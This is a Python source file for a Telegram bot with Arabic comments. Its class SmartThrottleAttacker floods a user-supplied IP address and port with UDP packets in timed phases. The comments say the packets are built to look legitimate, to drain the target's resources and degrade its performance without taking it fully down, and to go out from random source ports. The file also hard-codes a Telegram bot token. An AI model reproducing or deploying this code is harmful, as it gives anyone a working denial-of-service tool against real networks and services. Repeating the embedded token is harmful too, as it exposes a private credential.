
import asyncio
import random
import socket
import time
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes

TOKEN = "6197840010:AAHYojr7jBnRT61bIPXVHiGBQmTiz2SRZNw"

class SmartThrottleAttacker:
    def __init__(self):
        self.active_attacks = {}
        
    async def start_throttle_attack(self, update: Update, target_ip: str, target_port: int, duration: int):
        user_id = update.effective_user.id
        
        if user_id in self.active_attacks:
            await update.message.reply_text("⚠️ يوجد هجوم نشط بالفعل")
            return
            
        self.active_attacks[user_id] = {'running': True}
        
        try:
            start_time = time.time()
            end_time = start_time + duration
            
            # إعدادات الهجوم الذكية
            phases = [
                {'size': 1400, 'interval': 0.01, 'duration': 3},  # مرحلة الضغط العالي
                {'size': 500, 'interval': 0.1, 'duration': 5},     # مرحلة التباطؤ
                {'size': 8000, 'interval': 0.05, 'duration': 4}    # مرحلة الضغط المتوسط
            ]
            
            while time.time() < end_time and self.active_attacks[user_id]['running']:
                # تغيير مراحل الهجوم بشكل دوري
                for phase in phases:
                    if not self.active_attacks[user_id]['running']:
                        break
                        
                    phase_end = time.time() + phase['duration']
                    while time.time() < phase_end and self.active_attacks[user_id]['running']:
                        self.send_smart_packet(target_ip, target_port, phase['size'])
                        await asyncio.sleep(phase['interval'])
            
            await update.message.reply_text(f"✅ اكتمل الهجوم على {target_ip}:{target_port}")
            
        except Exception as e:
            await update.message.reply_text(f"❌ خطأ: {str(e)}")
        finally:
            if user_id in self.active_attacks:
                del self.active_attacks[user_id]
    
    def send_smart_packet(self, target_ip: str, target_port: int, size: int):
        """إرسال حزم ذكية للتأثير على الأداء دون توقف كامل"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            
            # إنشاء حزم تبدو شرعية ولكنها تستهلك الموارد
            payload = bytes([random.randint(48, 122) for _ in range(size)])  # بيانات تبدو كطلبات عادية
            
            # إرسال من منفذ مصدر عشوائي بين 1024 و65535
            sock.bind(('0.0.0.0', random.randint(1024, 65535)))
            sock.sendto(payload, (target_ip, target_port))
            sock.close()
        except:
            pass
